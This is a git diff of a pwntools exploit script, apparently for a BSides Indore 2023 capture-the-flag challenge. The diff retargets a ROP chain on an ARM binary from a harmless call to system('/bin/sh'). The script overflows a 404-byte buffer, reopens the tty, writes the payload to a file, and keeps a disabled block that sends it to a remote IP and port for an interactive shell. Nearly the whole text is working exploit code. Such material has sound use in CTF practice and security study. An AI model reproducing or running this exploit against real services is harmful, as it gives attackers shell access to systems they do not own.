@@ -82,6 +82,7 @@ def build_set_r0(r0, r6):
 
 if True:
     tty_path = b"/dev/tty\x00"
+    #tty_path = b"/dev/pts/9\x00"
 
     payload = b"0" * 0x20
     payload += b"1" * 4
@@ -91,7 +92,7 @@ if True:
     payload += p32(rop_bx_lr_adr)
 
     # write to r1
-    payload += p32(os.O_RDWR)
+    payload += p32(os.O_RDONLY)
 
     r4_overflow = 0xFFFFFFFF - (len(tty_path) + 2) + 1  # overflow provocing
     # move r8 to r0
@@ -110,7 +111,7 @@ if True:
     # move r1 to r0 and set r1 = O_RDRW
     payload += b"0" * (4 * 4) # for add sp
     payload += mov_r0_r1_t(rop_r1_t_adr + 1)
-    payload += p32(os.O_RDWR)
+    payload += p32(os.O_WRONLY)
 
     payload += call_open_t(rop_add_sp_0xc_t_adr + 1)
     # open uses 16bytes of stack, reserve it
@@ -118,7 +119,7 @@ if True:
     payload += b"0" * (4 * 4)  # for add sp
 
     payload += mov_r0_r1_t(rop_r1_t_adr + 1)
-    payload += p32(os.O_RDWR)
+    payload += p32(os.O_WRONLY)
 
     payload += call_open_t(rop_add_sp_0xc_t_adr + 1)
     # open uses 16bytes of stack, reserve it
@@ -126,25 +127,28 @@ if True:
     payload += b"0" * (4 * 4)  # for add sp
 
     # NOW WE CAN USE ROP TO CALL SYSTEM !!!!!!! (I'm so tired)
-    payload += build_set_r0(location_date, 0)
-    payload += p32(rop_sice_t_adr + 1)
-    print(len(payload))
+    payload += build_set_r0(location_bin_sh, 0)
+    payload += p32(rop_system_t_adr + 1)
     assert len(payload) < (404 - len(tty_path) - 2)
     payload += b"0" * (404 - len(payload) - len(tty_path) - 2)
 
     payload += tty_path
+    print(f"Payload Length: 0x{len(payload):x}")
 else:
-    payload = b"0" * 0x190
+    payload = b"0" * 0x192
     # with 0x200 bytes calls to system don't resolve
     ...
-
 with open("/local-tmp/payload", "bw") as fp:
     fp.write(payload + b"\n")
     fp.write(b"ls")
 
-# r = remote("34.125.56.151", 2222, ssl=False)
-# r.sendline(payload)
-# r.interactive()
+exit()
+
+if False:
+    r = remote("34.125.56.151", 2222, ssl=False)
+    r.sendline(payload)
+    r.interactive()
+    exit()
 
 io = gdb.debug(context.binary.path, gdbscript="""
 source /home/elizabeth/Documents/Projects/ccc/ctfriday-bsidesindore23/pwndbg/gdbinit.py
